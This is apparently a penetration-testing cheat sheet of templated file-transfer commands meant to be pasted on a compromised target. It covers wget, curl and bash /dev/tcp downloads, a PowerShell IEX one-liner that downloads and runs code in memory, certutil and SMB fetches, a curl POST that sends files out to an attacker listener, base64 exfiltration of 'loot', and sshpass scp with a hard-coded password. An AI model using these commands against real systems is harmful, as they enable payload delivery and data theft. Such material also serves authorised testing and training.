# Getting files onto and off a box. Serve side runs locally (`serve`, `smbserve`);
# the fetch lines are what you paste on the target.

# linux · wget
wget http://{{LHOST}}:8000/{{FILE}} -O /tmp/{{FILE}}

# linux · curl
curl -s http://{{LHOST}}:8000/{{FILE}} -o /tmp/{{FILE}}

# linux · no wget, no curl (bash /dev/tcp)
exec 3<>/dev/tcp/{{LHOST}}/8000; printf 'GET /{{FILE}} HTTP/1.0\r\n\r\n' >&3; cat <&3 > /tmp/{{FILE}}

# windows · powershell download
powershell -c "iwr http://{{LHOST}}:8000/{{FILE}} -OutFile C:\Windows\Temp\{{FILE}}"

# windows · powershell download and run in memory
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}:8000/{{FILE}}')"

# windows · certutil
certutil -urlcache -f http://{{LHOST}}:8000/{{FILE}} C:\Windows\Temp\{{FILE}}

# windows · copy from an SMB share (start it with `smbserve`)
copy \\{{LHOST}}\share\{{FILE}} C:\Windows\Temp\{{FILE}}

# exfil · POST a file back to a local listener
curl -s -X POST --data-binary @{{FILE}} http://{{LHOST}}:8000/

# exfil · base64 through the shell you already have
base64 -w0 {{FILE}}

# local · receive a base64 blob pasted back
read -r b64 && printf '%s' "$b64" | base64 -d > loot.bin

# scp with a password (avoids the interactive prompt)
sshpass -p '{{P}}' scp {{FILE}} {{U}}@{{RHOST}}:/tmp/{{FILE}}
